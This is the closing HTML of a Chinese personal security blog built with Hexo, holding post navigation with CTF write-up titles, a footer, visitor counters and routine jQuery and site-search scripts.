+            <a href="/2021/03/01/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86writeup/" title="上一篇: 第十二届全国大学生信息安全竞赛部分writeup">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/11/14/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9B%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA/" title="下一篇: 百度杯CTF比赛 十二月场">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/08/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B01-1/">ATT&CK红队评估1.1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/01/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86writeup/">第十二届全国大学生信息安全竞赛部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/18/buuctf/">buuctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/14/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9B%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA/">百度杯CTF比赛 十二月场</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/14/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/">西湖论剑wp</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2021 ch3nl3
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript">
+      window.onload = function(){
+        document.getElementById("search").onclick = function(){
+            console.log("search")
+            search();
+        }
+      }
+      function search(){
+        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
+      }
+    </script>
+
+  </div>
+</body>
+</html>
